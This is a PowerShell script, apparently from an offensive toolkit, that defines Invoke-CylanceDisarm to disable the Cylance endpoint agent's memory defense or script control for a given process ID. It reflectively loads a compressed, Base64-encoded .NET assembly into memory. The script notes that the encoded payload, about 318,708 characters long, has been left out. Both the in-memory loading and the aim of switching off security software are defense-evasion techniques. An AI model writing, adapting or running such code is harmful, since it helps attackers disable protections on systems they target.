function Invoke-CylanceDisarm
{
    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [int]$ProcessID,
        [parameter(Mandatory=$false)]
        [switch]$DisableMemDef,
        [parameter(Mandatory=$false)]
        [switch]$DisableScriptCntrl
    )
    $isAdmin = [System.Security.Principal.WindowsPrincipal]::new([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")
    if (-not $isAdmin) {
        Write-Warning "[-] Administratrive privileges required to obtain a process handle to the CylanceSvc process"
        break
    }
    $argsstring = @("--pid=$ProcessID")
    if ($PSBoundParameters['DisableMemDef']) {
        $argsstring += "--DisableMemDef"
    }
    elseif ($PSBoundParameters['DisableScriptCntrl']) {
        $argsstring += "--DisableScriptCntrl"
    }
    [CyDuck.Program]::Main($argsstring)
}
$EncodedCompressedFile = @'
1Lp1WJTPFzi6bMJSUkt3LUuX...XqDvsIjK7/F+cMLX+Wc/3/8Xzn+Gw==
'@ # NOTE: The actual 318708-character Base64 string omitted for readability.
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](257536)
$DeflatedStream.Read($UncompressedFileBytes, 0, 257536) | Out-Null
[Reflection.Assembly]::Load($UncompressedFileBytes)
